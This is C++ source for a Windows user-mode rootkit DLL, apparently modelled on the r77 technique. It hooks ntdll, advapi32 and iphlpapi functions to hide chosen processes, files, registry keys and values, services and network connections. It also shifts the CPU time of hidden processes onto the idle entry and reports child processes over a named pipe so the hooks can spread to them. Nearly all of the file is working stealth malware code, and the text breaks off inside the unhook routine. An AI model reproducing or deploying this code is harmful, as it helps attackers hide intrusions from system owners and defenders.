#include <winsock2.h>
#include <windows.h>
#include <winsvc.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <cstring>

#include "IatHook.h"
#include "NimbusConfig.h"
#include "InlineHook.h"
#include "WinStruct.h"

#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define STATUS_NO_SUCH_FILE  ((NTSTATUS)0xC000000FL)

namespace nt
{
	using lpNtQuerySystemInformation = NTSTATUS(NTAPI*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
	lpNtQuerySystemInformation lpOrgNtQuerySystemInformation;

	using lpNtQueryDirectoryFile = NTSTATUS(NTAPI*)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
	lpNtQueryDirectoryFile lpOrgNtQueryDirectoryFile;

	using lpNtQueryDirectoryFileEx = NTSTATUS(NTAPI*)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName, BOOLEAN RestartScan);
	lpNtQueryDirectoryFileEx lpOrgNtQueryDirectoryFileEx;

	using lpNtEnumerateKey = NTSTATUS(NTAPI*)(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength);
	lpNtEnumerateKey lpOrgNtEnumerateKey;

	using lpNtEnumerateValueKey = NTSTATUS(NTAPI*)(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);
	lpNtEnumerateValueKey lpOrgNtEnumerateValueKey;

	using lpNtQueryKey = NTSTATUS(NTAPI*)(HANDLE KeyHandle, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength);
	lpNtQueryKey lpOrgNtQueryKey;

	using lpEnumServiceGroupW = BOOL(WINAPI*)(SC_HANDLE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPVOID);
	using lpEnumServicesStatusExW = BOOL(WINAPI*)(SC_HANDLE, SC_ENUM_TYPE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPCWSTR);

	lpEnumServiceGroupW lpOrgEnumServiceGroupW;
	lpEnumServicesStatusExW lpOrgEnumServicesStatusExW;
	using lpNtResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
	lpNtResumeThread lpOrgNtResumeThread;
	using lpGetExtendedTcpTable = DWORD(WINAPI*)(PVOID TcpTable, PDWORD SizePointer, BOOL Order, ULONG Family, ULONG TableClass, ULONG Reserved);
	lpGetExtendedTcpTable lpOrgGetExtendedTcpTable;

	using lpGetExtendedUdpTable = DWORD(WINAPI*)(PVOID UdpTable, PDWORD SizePointer, BOOL Order, ULONG Family, ULONG TableClass, ULONG Reserved);
	lpGetExtendedUdpTable lpOrgGetExtendedUdpTable;
}


namespace match
{
	static bool IsHiddenName(const wchar_t* name, size_t nameLength)
	{
		return NimbusConfig::IsHiddenName(name, nameLength);
	}

	static bool IsHiddenName(const wchar_t* name)
	{
		return name != nullptr && IsHiddenName(name, wcslen(name));
	}
}


namespace processes
{
	static void HideProcesses(PSYSTEM_PROCESS_INFORMATION processList)
	{
		LARGE_INTEGER hiddenUserTime {};
		LARGE_INTEGER hiddenKernelTime {};

		auto lpCurrentProcess = processList;
		while (lpCurrentProcess->NextEntryOffset != 0)
		{
			auto lpNextProcess = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)lpCurrentProcess + lpCurrentProcess->NextEntryOffset);

			const bool hiddenByName = match::IsHiddenName(lpNextProcess->ImageName.Buffer, lpNextProcess->ImageName.Length / sizeof(WCHAR));
			const bool hiddenByPid = NimbusConfig::IsHiddenPid((DWORD)(DWORD_PTR)lpNextProcess->UniqueProcessId);
			if (hiddenByName || hiddenByPid)
			{
				hiddenUserTime.QuadPart += ((LARGE_INTEGER*)lpNextProcess->Reserved1)[4].QuadPart;
				hiddenKernelTime.QuadPart += ((LARGE_INTEGER*)lpNextProcess->Reserved1)[5].QuadPart;

				lpCurrentProcess->NextEntryOffset = lpNextProcess->NextEntryOffset != 0
					? lpCurrentProcess->NextEntryOffset + lpNextProcess->NextEntryOffset
					: 0;
			}
			else
				lpCurrentProcess = lpNextProcess;
		}

		PSYSTEM_PROCESS_INFORMATION idleEntry = processList;
		while (idleEntry != nullptr)
		{
			if (idleEntry->UniqueProcessId == nullptr)
			{
				((LARGE_INTEGER*)idleEntry->Reserved1)[4].QuadPart += hiddenUserTime.QuadPart;
				((LARGE_INTEGER*)idleEntry->Reserved1)[5].QuadPart += hiddenKernelTime.QuadPart;
				break;
			}

			if (idleEntry->NextEntryOffset == 0)
				break;
			idleEntry = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)idleEntry + idleEntry->NextEntryOffset);
		}
	}
}


namespace files
{

	static bool GetDirectoryRecordLayout(FILE_INFORMATION_CLASS infoClass, ULONG& fileNameOffset)
	{
		switch (infoClass)
		{
		case FILE_INFORMATION_CLASS::FileDirectoryInformation:       fileNameOffset = 64;  break;
		case FILE_INFORMATION_CLASS::FileFullDirectoryInformation:   fileNameOffset = 68;  break;
		case FILE_INFORMATION_CLASS::FileBothDirectoryInformation:   fileNameOffset = 94;  break;
		case FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation: fileNameOffset = 104; break;
		case FILE_INFORMATION_CLASS::FileIdExtdDirectoryInformation: fileNameOffset = 88;  break;
		default: return false;
		}
		return true;
	}

	static ULONG GetRecordNextOffset(const BYTE* record)
	{
		return *(const ULONG*)record;
	}

	static ULONG GetRecordNameLength(const BYTE* record)
	{
		return *(const ULONG*)(record + 60);
	}

	static bool IsHiddenRecord(const BYTE* record, ULONG fileNameOffset, const wchar_t* directoryPath)
	{
		const wchar_t* name = (const wchar_t*)(record + fileNameOffset);
		const ULONG nameLength = GetRecordNameLength(record) / sizeof(WCHAR);
		if (match::IsHiddenName(name, nameLength))
			return true;

		return directoryPath != nullptr && NimbusConfig::IsHiddenItemPath(directoryPath, name, nameLength);
	}

	static bool GetHandleDosPath(HANDLE fileHandle, wchar_t* buffer, ULONG bufferChars)
	{
		const DWORD length = GetFinalPathNameByHandleW(fileHandle, buffer, bufferChars, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
		if (length == 0 || length >= bufferChars)
			return false;

		if (wcsncmp(buffer, L"\\\\?\\", 4) == 0)
			memmove(buffer, buffer + 4, (length - 4 + 1) * sizeof(wchar_t));

		return buffer[0] != L'\0';
	}

	static ULONG GetRecordSize(const BYTE* record, ULONG fileNameOffset)
	{
		const ULONG next = GetRecordNextOffset(record);
		return next != 0 ? next : (ULONG)((fileNameOffset + GetRecordNameLength(record) + 7) & ~(ULONG)7);
	}

	static bool HideDirectoryRecords(BYTE* fileInformation, ULONG fileNameOffset, const wchar_t* directoryPath)
	{
		while (IsHiddenRecord(fileInformation, fileNameOffset, directoryPath))
		{
			const ULONG skip = GetRecordNextOffset(fileInformation);
			if (skip == 0)
				return true;

			ULONG tailSize = 0;
			for (const BYTE* record = fileInformation + skip;;)
			{
				tailSize += GetRecordSize(record, fileNameOffset);
				const ULONG next = GetRecordNextOffset(record);
				if (next == 0)
					break;
				record += next;
			}

			memmove(fileInformation, fileInformation + skip, tailSize);
		}

		BYTE* current = fileInformation;
		while (GetRecordNextOffset(current) != 0)
		{
			BYTE* next = current + GetRecordNextOffset(current);
			if (IsHiddenRecord(next, fileNameOffset, directoryPath))
			{

				*(ULONG*)current = GetRecordNextOffset(next) != 0
					? GetRecordNextOffset(current) + GetRecordNextOffset(next)
					: 0;
			}
			else
				current = next;
		}

		return false;
	}
}


namespace registry
{

	static bool IsHiddenKeyRecord(PVOID keyInformation, KEY_INFORMATION_CLASS infoClass)
	{
		if (infoClass == KEY_INFORMATION_CLASS::KeyBasicInformation)
		{
			const auto info = (PKEY_BASIC_INFORMATION)keyInformation;
			return match::IsHiddenName(info->Name, info->NameLength / sizeof(WCHAR));
		}
		if (infoClass == KEY_INFORMATION_CLASS::KeyNodeInformation)
		{
			const auto info = (PKEY_NODE_INFORMATION)keyInformation;
			return match::IsHiddenName(info->Name, info->NameLength / sizeof(WCHAR));
		}
		return false;
	}

	struct RegistryEnumCache
	{
		HANDLE keyHandle;
		ULONG lastVisibleIndex;
		ULONG nextRealIndex;
		ULONG nextVisibleIndex;
	};

	static DWORD g_keyCacheTls = TLS_OUT_OF_INDEXES;
	static DWORD g_valueCacheTls = TLS_OUT_OF_INDEXES;

	static RegistryEnumCache* GetEnumCache(DWORD& tlsIndex)
	{
		if (tlsIndex == TLS_OUT_OF_INDEXES)
			return nullptr;

		auto cache = (RegistryEnumCache*)TlsGetValue(tlsIndex);
		if (cache == nullptr)
		{
			cache = (RegistryEnumCache*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RegistryEnumCache));
			if (cache != nullptr)
				TlsSetValue(tlsIndex, cache);
		}
		return cache;
	}

	static void InitEnumCaches()
	{
		g_keyCacheTls = TlsAlloc();
		g_valueCacheTls = TlsAlloc();
	}

	// Serves the Index-th VISIBLE entry. Sequential callers resume from the last
	// known position (r77 technique): turns the naive O(N^2) re-scan into O(N)
	// per full enumeration, which is what keeps UI threads from freezing on
	// large keys (CLSID and friends).
	static NTSTATUS NTAPI hkNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength)
	{
		if (KeyInformationClass != KEY_INFORMATION_CLASS::KeyBasicInformation &&
			KeyInformationClass != KEY_INFORMATION_CLASS::KeyNodeInformation)
			return nt::lpOrgNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);

		RegistryEnumCache* cache = GetEnumCache(g_keyCacheTls);

		ULONG realIndex = 0;
		ULONG visibleIndex = 0;
		if (cache != nullptr && cache->keyHandle == KeyHandle && cache->lastVisibleIndex + 1 == Index)
		{
			realIndex = cache->nextRealIndex;
			visibleIndex = cache->nextVisibleIndex;
		}

		BYTE buffer[2048];
		for (;;)
		{
			ULONG scanLength = 0;
			const NTSTATUS status = nt::lpOrgNtEnumerateKey(KeyHandle, realIndex, KEY_INFORMATION_CLASS::KeyBasicInformation, buffer, sizeof(buffer), &scanLength);
			if (status != STATUS_SUCCESS)
				return nt::lpOrgNtEnumerateKey(KeyHandle, realIndex, KeyInformationClass, KeyInformation, Length, ResultLength);

			if (!IsHiddenKeyRecord(buffer, KEY_INFORMATION_CLASS::KeyBasicInformation))
			{
				if (visibleIndex == Index)
				{
					if (cache != nullptr)
					{
						cache->keyHandle = KeyHandle;
						cache->lastVisibleIndex = Index;
						cache->nextRealIndex = realIndex + 1;
						cache->nextVisibleIndex = visibleIndex + 1;
					}
					return nt::lpOrgNtEnumerateKey(KeyHandle, realIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
				}
				++visibleIndex;
			}

			++realIndex;
		}
	}

	static NTSTATUS NTAPI hkNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
	{
		if (KeyValueInformationClass != KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
			return nt::lpOrgNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);

		RegistryEnumCache* cache = GetEnumCache(g_valueCacheTls);

		ULONG realIndex = 0;
		ULONG visibleIndex = 0;
		if (cache != nullptr && cache->keyHandle == KeyHandle && cache->lastVisibleIndex + 1 == Index)
		{
			realIndex = cache->nextRealIndex;
			visibleIndex = cache->nextVisibleIndex;
		}

		BYTE buffer[2048];
		for (;;)
		{
			ULONG scanLength = 0;
			const NTSTATUS status = nt::lpOrgNtEnumerateValueKey(KeyHandle, realIndex, KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation, buffer, sizeof(buffer), &scanLength);
			if (status != STATUS_SUCCESS)
				return nt::lpOrgNtEnumerateValueKey(KeyHandle, realIndex, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);

			const auto info = (PKEY_VALUE_BASIC_INFORMATION)buffer;
			if (!match::IsHiddenName(info->Name, info->NameLength / sizeof(WCHAR)))
			{
				if (visibleIndex == Index)
				{
					if (cache != nullptr)
					{
						cache->keyHandle = KeyHandle;
						cache->lastVisibleIndex = Index;
						cache->nextRealIndex = realIndex + 1;
						cache->nextVisibleIndex = visibleIndex + 1;
					}
					return nt::lpOrgNtEnumerateValueKey(KeyHandle, realIndex, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
				}
				++visibleIndex;
			}

			++realIndex;
		}
	}

	static ULONG CountHiddenSubKeys(HANDLE keyHandle)
	{
		BYTE buffer[2048];
		ULONG count = 0;
		for (ULONG index = 0;; ++index)
		{
			ULONG resultLength = 0;
			if (nt::lpOrgNtEnumerateKey(keyHandle, index, KEY_INFORMATION_CLASS::KeyBasicInformation, buffer, sizeof(buffer), &resultLength) != STATUS_SUCCESS)
				break;
			if (IsHiddenKeyRecord(buffer, KEY_INFORMATION_CLASS::KeyBasicInformation))
				++count;
		}
		return count;
	}

	static ULONG CountHiddenValues(HANDLE keyHandle)
	{
		BYTE buffer[2048];
		ULONG count = 0;
		for (ULONG index = 0;; ++index)
		{
			ULONG resultLength = 0;
			if (nt::lpOrgNtEnumerateValueKey(keyHandle, index, KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation, buffer, sizeof(buffer), &resultLength) != STATUS_SUCCESS)
				break;
			const auto info = (PKEY_VALUE_BASIC_INFORMATION)buffer;
			if (match::IsHiddenName(info->Name, info->NameLength / sizeof(WCHAR)))
				++count;
		}
		return count;
	}

	static NTSTATUS NTAPI hkNtQueryKey(HANDLE KeyHandle, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength)
	{
		const NTSTATUS status = nt::lpOrgNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
		if (status != STATUS_SUCCESS || KeyInformationClass != KEY_INFORMATION_CLASS::KeyFullInformation || KeyInformation == nullptr)
			return status;

		const auto info = (PKEY_FULL_INFORMATION)KeyInformation;
		const ULONG hiddenKeys = CountHiddenSubKeys(KeyHandle);
		if (hiddenKeys < info->SubKeys)
			info->SubKeys -= hiddenKeys;
		else
			info->SubKeys = 0;

		const ULONG hiddenValues = CountHiddenValues(KeyHandle);
		if (hiddenValues < info->Values)
			info->Values -= hiddenValues;
		else
			info->Values = 0;

		return status;
	}
}


namespace processes
{

	static NTSTATUS NTAPI hkNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
	{
		const NTSTATUS QueryStatus = nt::lpOrgNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

		if (QueryStatus == STATUS_SUCCESS &&
			SystemInformationClass == _SYSTEM_INFORMATION_CLASS::SystemProcessInformation &&
			SystemInformation != nullptr)
		{
			processes::HideProcesses((PSYSTEM_PROCESS_INFORMATION)SystemInformation);
		}

		return QueryStatus;
	}
}


namespace files
{

	static NTSTATUS NTAPI hkNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
	{
		NTSTATUS QueryStatus = nt::lpOrgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

		ULONG fileNameOffset;
		if (!GetDirectoryRecordLayout(FileInformationClass, fileNameOffset) || FileInformation == nullptr)
			return QueryStatus;

		wchar_t directoryPathBuffer[MAX_PATH];
		const wchar_t* directoryPath = nullptr;
		if (NimbusConfig::HasPathRules() && GetHandleDosPath(FileHandle, directoryPathBuffer, MAX_PATH))
			directoryPath = directoryPathBuffer;

		while (QueryStatus == STATUS_SUCCESS && HideDirectoryRecords((BYTE*)FileInformation, fileNameOffset, directoryPath))
			QueryStatus = nt::lpOrgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, FALSE);

		return QueryStatus;
	}

	static NTSTATUS NTAPI hkNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName, BOOLEAN RestartScan)
	{
		NTSTATUS QueryStatus = nt::lpOrgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName, RestartScan);

		ULONG fileNameOffset;
		if (!GetDirectoryRecordLayout(FileInformationClass, fileNameOffset) || FileInformation == nullptr)
			return QueryStatus;

		wchar_t directoryPathBuffer[MAX_PATH];
		const wchar_t* directoryPath = nullptr;
		if (NimbusConfig::HasPathRules() && GetHandleDosPath(FileHandle, directoryPathBuffer, MAX_PATH))
			directoryPath = directoryPathBuffer;

		while (QueryStatus == STATUS_SUCCESS && HideDirectoryRecords((BYTE*)FileInformation, fileNameOffset, directoryPath))
			QueryStatus = nt::lpOrgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName, FALSE);

		return QueryStatus;
	}
}


namespace services
{

	static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved)
	{
		const BOOL result = nt::lpOrgEnumServiceGroupW(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, reserved);

		if (result && services && servicesReturned && *servicesReturned > 0)
		{
			const auto serviceStatus = (LPENUM_SERVICE_STATUSW)services;
			DWORD kept = 0;
			for (DWORD i = 0; i < *servicesReturned; ++i)
			{
				if (!match::IsHiddenName(serviceStatus[i].lpServiceName))
					serviceStatus[kept++] = serviceStatus[i];
			}
			*servicesReturned = kept;
		}

		return result;
	}

	static BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
	{
		const BOOL result = nt::lpOrgEnumServicesStatusExW(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);

		if (result && services && servicesReturned && *servicesReturned > 0)
		{
			const auto serviceStatus = (LPENUM_SERVICE_STATUS_PROCESSW)services;
			DWORD kept = 0;
			for (DWORD i = 0; i < *servicesReturned; ++i)
			{
				if (!match::IsHiddenName(serviceStatus[i].lpServiceName))
					serviceStatus[kept++] = serviceStatus[i];
			}
			*servicesReturned = kept;
		}

		return result;
	}
}


namespace network
{

	static bool IsHiddenOwnerPid(DWORD owningPid)
	{
		if (owningPid == 0 || owningPid == GetCurrentProcessId())
			return false;

		if (NimbusConfig::IsHiddenPid(owningPid))
			return true;

		const HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, owningPid);
		if (process == nullptr)
			return false;

		wchar_t imageName[MAX_PATH] = {};
		DWORD size = MAX_PATH;
		const bool resolved = QueryFullProcessImageNameW(process, 0, imageName, &size) != FALSE;
		CloseHandle(process);

		if (!resolved)
			return false;

		const wchar_t* basename = imageName + size;
		while (basename > imageName && basename[-1] != L'\\' && basename[-1] != L'/')
			--basename;

		return match::IsHiddenName(basename);
	}

	template <typename Row>
	static void FilterRows(DWORD& entryCount, Row* rows, bool (*isHidden)(const Row&))
	{
		DWORD kept = 0;
		for (DWORD i = 0; i < entryCount; ++i)
		{
			if (!isHidden(rows[i]))
				rows[kept++] = rows[i];
		}
		entryCount = kept;
	}

	static bool OwnerHidden(const MIB_TCPROW_OWNER_PID& row) { return IsHiddenOwnerPid(row.dwOwningPid) || NimbusConfig::IsHiddenPort(row.dwLocalPort, row.dwRemotePort); }
	static bool OwnerHidden(const MIB_TCP6ROW_OWNER_PID& row) { return IsHiddenOwnerPid(row.dwOwningPid) || NimbusConfig::IsHiddenPort(row.dwLocalPort, row.dwRemotePort); }
	static bool OwnerHidden(const MIB_UDPROW_OWNER_PID& row) { return IsHiddenOwnerPid(row.dwOwningPid) || NimbusConfig::IsHiddenPort(row.dwLocalPort, 0); }
	static bool OwnerHidden(const MIB_UDP6ROW_OWNER_PID& row) { return IsHiddenOwnerPid(row.dwOwningPid) || NimbusConfig::IsHiddenPort(row.dwLocalPort, 0); }

	static DWORD WINAPI hkGetExtendedTcpTable(PVOID TcpTable, PDWORD SizePointer, BOOL Order, ULONG Family, ULONG TableClass, ULONG Reserved)
	{
		const DWORD result = nt::lpOrgGetExtendedTcpTable(TcpTable, SizePointer, Order, Family, TableClass, Reserved);
		if (result != NO_ERROR || TcpTable == nullptr)
			return result;

		if (TableClass == TCP_TABLE_OWNER_PID_LISTENER || TableClass == TCP_TABLE_OWNER_PID_CONNECTIONS || TableClass == TCP_TABLE_OWNER_PID_ALL)
		{
			if (Family == AF_INET)
			{
				const auto table = (MIB_TCPTABLE_OWNER_PID*)TcpTable;
				FilterRows(table->dwNumEntries, table->table, &OwnerHidden);
			}
			else if (Family == AF_INET6)
			{
				const auto table = (MIB_TCP6TABLE_OWNER_PID*)TcpTable;
				FilterRows(table->dwNumEntries, table->table, &OwnerHidden);
			}
		}
		return result;
	}

	static DWORD WINAPI hkGetExtendedUdpTable(PVOID UdpTable, PDWORD SizePointer, BOOL Order, ULONG Family, ULONG TableClass, ULONG Reserved)
	{
		const DWORD result = nt::lpOrgGetExtendedUdpTable(UdpTable, SizePointer, Order, Family, TableClass, Reserved);
		if (result != NO_ERROR || UdpTable == nullptr)
			return result;

		if (TableClass == UDP_TABLE_OWNER_PID)
		{
			if (Family == AF_INET)
			{
				const auto table = (MIB_UDPTABLE_OWNER_PID*)UdpTable;
				FilterRows(table->dwNumEntries, table->table, &OwnerHidden);
			}
			else if (Family == AF_INET6)
			{
				const auto table = (MIB_UDP6TABLE_OWNER_PID*)UdpTable;
				FilterRows(table->dwNumEntries, table->table, &OwnerHidden);
			}
		}

		return result;
	}
}


namespace intercept
{

	static void InstallHook(LPCSTR lpModuleName, LPCSTR lpFunctionName, LPVOID lpHookFunction, LPVOID* lplpOriginal, LPCSTR lpTargetModuleName = nullptr)
	{
		LPVOID original = lpTargetModuleName != nullptr
			? Iat::Hook(lpModuleName, lpFunctionName, lpHookFunction, lpTargetModuleName)
			: Iat::Hook(lpModuleName, lpFunctionName, lpHookFunction);

		if (original != nullptr)
			*lplpOriginal = original;
	}

	static void InstallHookInBoth(LPCSTR lpModuleName, LPCSTR lpFunctionName, LPVOID lpHookFunction, LPVOID* lplpOriginal, LPCSTR lpSecondTarget, LPCSTR lpThirdTarget = nullptr)
	{
		intercept::InstallHook(lpModuleName, lpFunctionName, lpHookFunction, lplpOriginal);
		intercept::InstallHook(lpModuleName, lpFunctionName, lpHookFunction, lplpOriginal, lpSecondTarget);
		if (lpThirdTarget != nullptr)
			intercept::InstallHook(lpModuleName, lpFunctionName, lpHookFunction, lplpOriginal, lpThirdTarget);
	}
}


namespace child
{

	struct ChildThreadId
	{
		PVOID UniqueProcess;
		PVOID UniqueThread;
	};

	struct ChildThreadBasicInformation
	{
		NTSTATUS ExitStatus;
		PVOID TebBaseAddress;
		ChildThreadId ClientId;
		PVOID AffinityMask;
		LONG Priority;
		LONG BasePriority;
	};

	static void NotifyChildProcess(HANDLE threadHandle)
	{
		using lpNtQueryInformationThread = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
		static const auto ntQueryInformationThread =
			reinterpret_cast<lpNtQueryInformationThread>(reinterpret_cast<void*>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread")));

		ChildThreadBasicInformation information = {};
		if (ntQueryInformationThread == nullptr ||
			ntQueryInformationThread(threadHandle, 0, &information, sizeof(information), nullptr) != STATUS_SUCCESS)
		{
			return;
		}

		const DWORD childPid = (DWORD)(DWORD_PTR)information.ClientId.UniqueProcess;
		if (childPid == 0 || childPid == GetCurrentProcessId())
			return;

		const HANDLE pipe = CreateFileW(L"\\\\.\\pipe\\nimbus_child", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
		if (pipe == INVALID_HANDLE_VALUE)
			return;

		DWORD written = 0;
		DWORD reply = 0;
		DWORD read = 0;
		if (WriteFile(pipe, &childPid, sizeof(childPid), &written, nullptr))
			ReadFile(pipe, &reply, sizeof(reply), &read, nullptr);
		CloseHandle(pipe);
	}

	static NTSTATUS NTAPI hkNtResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount)
	{
		NotifyChildProcess(ThreadHandle);
		return nt::lpOrgNtResumeThread(ThreadHandle, PreviousSuspendCount);
	}
}



static DWORD WINAPI InitHook(LPVOID)
{
	WCHAR executablePath[MAX_PATH] = {};
	if (GetModuleFileNameW(nullptr, executablePath, MAX_PATH) != 0)
	{
		const WCHAR* basename = executablePath + wcslen(executablePath);
		while (basename > executablePath && basename[-1] != L'\\' && basename[-1] != L'/')
			--basename;

		if (match::IsHiddenName(basename))
			return 0;
	}

	registry::InitEnumCaches();
	NimbusConfig::StartRefreshThread();

	nt::lpOrgNtResumeThread = (nt::lpNtResumeThread)InlineHook::Hook("NtResumeThread", (LPVOID)child::hkNtResumeThread);
	if (nt::lpOrgNtResumeThread == nullptr)
		intercept::InstallHook("ntdll.dll", "NtResumeThread", (LPVOID)child::hkNtResumeThread, (LPVOID*)&nt::lpOrgNtResumeThread);

	nt::lpOrgNtQuerySystemInformation = (nt::lpNtQuerySystemInformation)InlineHook::Hook("NtQuerySystemInformation", (LPVOID)processes::hkNtQuerySystemInformation);
	if (nt::lpOrgNtQuerySystemInformation == nullptr)
		intercept::InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)processes::hkNtQuerySystemInformation, (LPVOID*)&nt::lpOrgNtQuerySystemInformation);

	nt::lpOrgNtQueryDirectoryFile = (nt::lpNtQueryDirectoryFile)InlineHook::Hook("NtQueryDirectoryFile", (LPVOID)files::hkNtQueryDirectoryFile);
	if (nt::lpOrgNtQueryDirectoryFile == nullptr)
		intercept::InstallHookInBoth("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)files::hkNtQueryDirectoryFile, (LPVOID*)&nt::lpOrgNtQueryDirectoryFile, "kernel32.dll", "windows.storage.dll");

	nt::lpOrgNtQueryDirectoryFileEx = (nt::lpNtQueryDirectoryFileEx)InlineHook::Hook("NtQueryDirectoryFileEx", (LPVOID)files::hkNtQueryDirectoryFileEx);
	if (nt::lpOrgNtQueryDirectoryFileEx == nullptr)
		intercept::InstallHookInBoth("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID)files::hkNtQueryDirectoryFileEx, (LPVOID*)&nt::lpOrgNtQueryDirectoryFileEx, "kernel32.dll", "windows.storage.dll");

	intercept::InstallHookInBoth("ntdll.dll", "NtEnumerateKey", (LPVOID)registry::hkNtEnumerateKey, (LPVOID*)&nt::lpOrgNtEnumerateKey, "kernelbase.dll");
	intercept::InstallHookInBoth("ntdll.dll", "NtEnumerateValueKey", (LPVOID)registry::hkNtEnumerateValueKey, (LPVOID*)&nt::lpOrgNtEnumerateValueKey, "kernelbase.dll");
	intercept::InstallHookInBoth("ntdll.dll", "NtQueryKey", (LPVOID)registry::hkNtQueryKey, (LPVOID*)&nt::lpOrgNtQueryKey, "kernelbase.dll");

	intercept::InstallHook("advapi32.dll", "EnumServiceGroupW", (LPVOID)services::HookedEnumServiceGroupW, (LPVOID*)&nt::lpOrgEnumServiceGroupW);
	intercept::InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID)services::HookedEnumServicesStatusExW, (LPVOID*)&nt::lpOrgEnumServicesStatusExW);

	intercept::InstallHook("iphlpapi.dll", "GetExtendedTcpTable", (LPVOID)network::hkGetExtendedTcpTable, (LPVOID*)&nt::lpOrgGetExtendedTcpTable);
	intercept::InstallHook("iphlpapi.dll", "GetExtendedUdpTable", (LPVOID)network::hkGetExtendedUdpTable, (LPVOID*)&nt::lpOrgGetExtendedUdpTable);

	return 0;
}

static void Unhook()
{

	const bool inlineNtqsi = InlineHook::Unhook("NtQuerySystemInformation");
	const bool inlineNtqdf = InlineHook::Unhook("NtQueryDirectoryFile");
	const bool inlineNtqdfex = InlineHook::Unhook("NtQueryDirectoryFileEx");

